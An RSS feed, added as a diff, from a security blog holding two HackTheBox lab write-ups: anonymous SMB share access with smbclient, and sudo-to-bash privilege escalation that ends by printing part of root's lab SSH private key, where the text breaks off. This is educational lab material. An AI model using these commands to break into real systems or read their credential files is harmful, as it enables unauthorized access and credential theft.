@@ -1,0 +1,745 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>HackTheBox on hushkat</title><link>https://hushkat.github.io/tags/hackthebox/</link><description>Recent content in HackTheBox on hushkat</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 25 Feb 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://hushkat.github.io/tags/hackthebox/index.xml" rel="self" type="application/rss+xml"/><item><title>DANCING</title><link>https://hushkat.github.io/p/dancing/</link><pubDate>Sun, 25 Feb 2024 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/dancing/</guid><description>&lt;img src="https://hushkat.github.io/p/dancing/Completed.png" alt="Featured image of post DANCING" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>This challenge is about the basics of SMB and how misconfigurations can lead to compromise of the system SMB is running on. SMB is an acronym for Server Message Block, a protocol used in networks for file sharing that is implemented on Microsoft Windows operating systems. A quick Google search can reveal the same:
+&lt;img src="https://hushkat.github.io/p/dancing/Q1.png"
+width="962"
+height="369"
+srcset="https://hushkat.github.io/p/dancing/Q1_hu11308264488664761824.png 480w, https://hushkat.github.io/p/dancing/Q1_hu4016774746937824341.png 1024w"
+loading="lazy"
+alt="google_search"
+class="gallery-image"
+data-flex-grow="260"
+data-flex-basis="625px"
+>&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;p>&lt;strong>Note&lt;/strong> If you&amp;rsquo;re following through practically, make sure you use the target&amp;rsquo;s machine&amp;rsquo;s IP provided once you click the start machine icon on the challenge webpage.&lt;/p>
+&lt;h3 id="enumeration">Enumeration.
+&lt;/h3>&lt;p>Once you spawn the target, you are given a vulnerable target&amp;rsquo;s IP (in my case: &lt;strong>10.129.84.148&lt;/strong> ) which we will enumerate by use of NMAP by running the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nmap 10.129.84.148
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>which should scan and give us a report on open ports running on the target as shown below:
+&lt;img src="https://hushkat.github.io/p/dancing/Q2.png"
+width="659"
+height="335"
+srcset="https://hushkat.github.io/p/dancing/Q2_hu3248943508001671093.png 480w, https://hushkat.github.io/p/dancing/Q2_hu18091934803613366051.png 1024w"
+loading="lazy"
+alt="nmap_results"
+class="gallery-image"
+data-flex-grow="196"
+data-flex-basis="472px"
+>&lt;/p>
+&lt;p>We see that the target has three open ports and one specifically running &lt;strong>Microsoft-ds&lt;/strong> on port 445.&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>Now that we know the service running on this port, we can try and list the shares available on the target by running the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">smbclient -N -L \\\\10.129.84.148
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;strong>-N&lt;/strong> option suppresses the password prompt that is needed to connect to this service, &lt;strong>-L&lt;/strong> on the other hand lists the shares available on the target. Here are the results from our target.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/dancing/Q3,4.png"
+width="663"
+height="327"
+srcset="https://hushkat.github.io/p/dancing/Q3,4_hu14095665078388616887.png 480w, https://hushkat.github.io/p/dancing/Q3,4_hu11767111108246697801.png 1024w"
+loading="lazy"
+alt="smb_shares"
+class="gallery-image"
+data-flex-grow="202"
+data-flex-basis="486px"
+>&lt;/p>
+&lt;p>We already know the shares available on the target, so I can now try to connect to each of the available shares, but I don&amp;rsquo;t have a password, so I am going to try to log in to each of them without giving a password.&lt;/p>
+&lt;h3 id="foothold">Foothold
+&lt;/h3>&lt;p>Things don&amp;rsquo;t seem to go as planned, except for just one share that lets me in without a password, the WorkShares share. Here is the command I ran to be able to connect to it:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">smbclient \\\\10.129.84.148\\WorkShares
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>When prompted for a password, press enter.
+&lt;img src="https://hushkat.github.io/p/dancing/Q6.png"
+width="659"
+height="456"
+srcset="https://hushkat.github.io/p/dancing/Q6_hu7996035004074927003.png 480w, https://hushkat.github.io/p/dancing/Q6_hu10980212056566475404.png 1024w"
+loading="lazy"
+alt="smb_shares"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+>&lt;/p>
+&lt;p>Now we list the directories available using &lt;strong>ls&lt;/strong> and see a couple of interesting stuff here, in essence, there are two users listed:&lt;/p>
+&lt;ul>
+&lt;li>Amy.J&lt;/li>
+&lt;li>James.P&lt;/li>
+&lt;/ul>
+&lt;p>I check the first user&amp;rsquo;s folder, but there is no sign of the flag. Next, I try to navigate to the second user&amp;rsquo;s folder.&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>I do this by running the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd James.P
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then I list the contents of his directory where we see a file called &lt;strong>flag.txt&lt;/strong> which we then download to our attack machine using:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">get flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then leave this service by running the &lt;strong>exit&lt;/strong> command.&lt;/p>
+&lt;p>Now since we are back on our attack machine we can navigate to the directory where the flag file is saved and view its contents.
+&lt;img src="https://hushkat.github.io/p/dancing/Flag.png"
+width="654"
+height="270"
+srcset="https://hushkat.github.io/p/dancing/Flag_hu14776464510738616293.png 480w, https://hushkat.github.io/p/dancing/Flag_hu13307367752523255337.png 1024w"
+loading="lazy"
+alt="flag"
+class="gallery-image"
+data-flex-grow="242"
+data-flex-basis="581px"
+>&lt;/p>
+&lt;p>We have our flag for this challenge. That also leaves us with all the answers to the questions that came with this challenge.&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In summary, the SMB protocol is very useful in sharing resources between hosts. However, a big security risk is onboarded if this protocol is misconfigured. This room has shown me how easy it can be to gain access to shares within an SMB if there are few to no strict security measures associated with it.&lt;/p>
+&lt;p>dr0idbot signing off.&lt;/p></description></item><item><title>Privilege Escalation</title><link>https://hushkat.github.io/p/privilege-escalation/</link><pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/privilege-escalation/</guid><description>&lt;img src="https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation.jpg" alt="Featured image of post Privilege Escalation" />&lt;p>This image is courtesy of &lt;a class="link" href="https://cyberhoot.com/cybrary/privilege-escalation-attack/" target="_blank" rel="noopener"
+>CyberHoot&lt;/a>&lt;/p>
+&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>After breaching a target&amp;rsquo;s defenses and exploiting system vulnerabilities, hackers often find themselves with limited privileges. To overcome this, privilege escalation becomes essential to navigate through defenses and gain the muscle needed to carry out a successful attack.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="privilege-escalation-challenge">Privilege Escalation Challenge.
+&lt;/h3>&lt;p>Welcome back to another HackTheBox challenge, an easy Capture The Flag (CTF) exercise. The past few blogs have been covering the module &lt;a class="link" href="https://academy.hackthebox.com/course/preview/getting-started" target="_blank" rel="noopener"
+>Getting Started&lt;/a>. The instructions provided are as follows:
+&lt;img src="https://hushkat.github.io/p/privilege-escalation/PrivilegeEscalation1.jpg"
+width="1021"
+height="300"
+srcset="https://hushkat.github.io/p/privilege-escalation/PrivilegeEscalation1_hu6869482866601827893.jpg 480w, https://hushkat.github.io/p/privilege-escalation/PrivilegeEscalation1_hu13295729096729830807.jpg 1024w"
+loading="lazy"
+alt="chall desc"
+class="gallery-image"
+data-flex-grow="340"
+data-flex-basis="816px"
+>
+&lt;a class="link" href="https://en.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener"
+>SSH&lt;/a> (Secure Shell) is a secure network communication protocol allowing encrypted connections between computers, making it suitable for use on insecure networks.&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>We begin by using the provided credentials to establish an SSH connection to the target machine:
+If you&amp;rsquo;re following through &lt;strong>Note&lt;/strong> that the machine IP and port number might be different in your case, make sure you replace that with what you have been given.&lt;/p>
+&lt;p>Our first command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">┌──(papab3ar㉿kali)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ssh user1@94.237.49.11 -p 31973
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Upon connection, a message about host authenticity appears. Confirm by typing &amp;ldquo;yes&amp;rdquo; and entering the provided password. A successful login grants terminal access:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">This system has been minimized by removing packages and content that are
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">not required on a system that users do not log into.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To restore this content, you can run the &amp;#39;unminimize&amp;#39; command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The programs included with the Ubuntu system are free software;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">the exact distribution terms for each program are described in the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">individual files in /usr/share/doc/*/copyright.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">applicable law.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Attempting to list directories reveals limited information. Exploring further, we discover another user, user2:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cd ../
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/home$ ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user1 user2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Navigation to user2&amp;rsquo;s directory uncovers the flag.txt file, but access is denied:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat: flag.txt: Permission denied
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>What a bummer! our current user has no permission to read user2 files or documents. So now I want to see the list of permissions the users on this machine have so I use:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The output:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Matching Defaults entries for user1 on
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User user1 may run the following commands on
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> (user2 : user2) NOPASSWD: /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Something interesting shows up here about our users.
+First, we see the text &lt;strong>NOPASSWD&lt;/strong>: Indicating that our current user (user1) is allowed to run the specified commands without being prompted for a password. This can be a security feature to streamline certain processes, but it also carries some security risks.&lt;/p>
+&lt;p>Then we note the &lt;strong>/bin/bash&lt;/strong>: This is the path to the &amp;ldquo;bash&amp;rdquo; shell executable. Allowing user1 to run &amp;ldquo;/bin/bash&amp;rdquo; means they have the ability to start an interactive shell session. This could potentially grant them significant control over the system.&lt;/p>
+&lt;p>With this in mind, I now want to see if it will work. So I run the following command for user2 as user1:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo -u user2 /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>From the terminal, this seems to have worked since the CLI switched from:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>to this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Notice that we now have user2 access. So, once again, we try to read the &lt;em>flag.txt&lt;/em> file and manage to get the flag.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cat flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTB{l473r4l_********_**_*******_u53r}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ah great, so what, are we done? Or is there more we could do here? We have further instructions:
+&lt;img src="https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation0.jpg"
+width="1026"
+height="58"
+srcset="https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation0_hu7155434506315083472.jpg 480w, https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation0_hu8725563002238112223.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="1768"
+data-flex-basis="4245px"
+>
+Now we try to see if we can be the &lt;strong>root&lt;/strong> user for this machine, escalating our privileges even further. First I navigate to the root user folder using the following commands:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd ../../
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cd root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then I list all directories and this is the output I get:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/root$ ls -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. .. .bash_history .bashrc .profile .ssh .viminfo flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As you can see here, we have our &lt;em>flag.txt&lt;/em> file. I&amp;rsquo;m tempted to open it, and I do, but again, I get denied permission to do so. I then notice another interesting directory,&lt;strong>.ssh&lt;/strong>. So I navigate to it and list its contents.&lt;/p>
+&lt;p>The &lt;strong>.ssh&lt;/strong> folder in a user&amp;rsquo;s home directory on a Unix-like operating system that contains important files and directories related to SSH (Secure Shell) authentication and communication.&lt;/p>
+&lt;p>&lt;strong>authorized_keys&lt;/strong>: Contains a list of public keys authorized to access the user account using SSH key-based authentication. Each line in this file represents a separate public key. When a client (remote computer) attempts to connect to the user account, the server checks if the client&amp;rsquo;s public key matches any of the keys listed in this file. If there&amp;rsquo;s a match, the client is granted access without needing to enter a password.&lt;/p>
+&lt;p>&lt;strong>id_rsa&lt;/strong>: A private key file for the user&amp;rsquo;s SSH key pair. The private key is kept secret and should never be shared or exposed. It is used for authentication when the user tries to log in to remote servers. When the user initiates an SSH connection, their local computer uses the private key to sign a challenge from the server, proving their identity without transmitting the actual private key. Only the corresponding public key is shared with remote servers.&lt;/p>
+&lt;p>&lt;strong>id_rsa.pub&lt;/strong>: Contains the public key that corresponds to the private key (id_rsa). The public key can be freely shared and is typically copied to remote servers to set up key-based authentication. Remote servers use the public key to verify the user&amp;rsquo;s identity during the SSH authentication process.&lt;/p>
+&lt;p>Now it is time to see if we have access to the &lt;strong>id_rsa&lt;/strong> file. If we do, we can use the root user&amp;rsquo;s private key to gain root access to this machine hence further elevating our privileges from user2. I open this file using the cat command and sure enough, I get access to the private key.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat id_rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PtQ8csvHq/GatgSo8oVyskZIRbWb7QvCQI7JsT+Pr4ieQayNIoDm6+i9F1hXyMc0VsAqMk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">05z9YKStLma0iN6l81Mr0dAI63x0mtwRKeHvJR+EiMtUTlAX9++kQJmD9F3lDSnLF4/dEy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">G4WQSAH7F8Jz3OrRKLprBiDf27LSPgOJ6j8OLn4bsiacaWFBl3+CqkXeGkecEHg5dIL4K+
